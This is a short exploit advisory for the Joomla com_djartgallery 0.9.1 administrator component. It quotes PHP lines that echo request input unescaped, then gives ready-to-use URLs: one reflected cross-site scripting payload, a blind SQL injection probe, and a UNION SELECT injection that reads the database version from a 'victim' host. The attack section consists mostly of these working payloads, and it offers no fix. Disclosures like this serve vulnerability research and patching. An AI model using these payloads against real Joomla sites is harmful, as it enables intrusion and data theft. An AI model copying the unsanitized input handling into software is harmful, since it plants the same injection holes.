#Version:		0.9.1

#Tested on:		Linux ubuntu32 2.6.32-22-generic x64

#Summary:

[+] Cross Site Scripting on administrator/components/com_djartgallery/views/editimage/tmpl/default.php:

	We can fond this code on line 183:
	...
	<input type="hidden" name="id" value="<?php echo JRequest::getVar('id'); ?>" />
	<input type="hidden" name="option" value="com_djartgallery" />
	<input type="hidden" name="task" value="editImage" />
	...

	You must see it }x)

	<input type="hidden" name="id" value="<?php echo JRequest::getVar('id'); ?>" />

	Method to exploit this could be next code injection:

	http://localhost/joomla/administrator/index.php?option=com_djartgallery&task=editItem
	&cid[]=%22%3E%3C/form%3E%3CSCRIPT%3Ealert%28%22XSS%20by%20r0i%22%29;%3C/script%3E

[+]Blind SQL Injection

	Also we can extract it databases information through Blind SQL Injection, on same parameter, how to we will see on next code:
administrator/components/com_djartgallery/controller.php, line 382:

	$link = 'index.php?option=com_djartgallery&task=com_djartgallery&task=editItem&cid[]='.JRequest::getVar('id');

	To exploit it:

	http://victim/administrator/index.php?option=com_djartgallery&task=editItem
	&cid[]=1'+and+1=1+--+

	Field 'Select Article' its changed when reply its true/false; but too its likely that run UNION injection:

	http://victim/administrator/index.php?option=com_djartgallery&task=editItem
	&cid[]=-1%27/*!UNION%20SELECT%20@@version,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25*/+--+
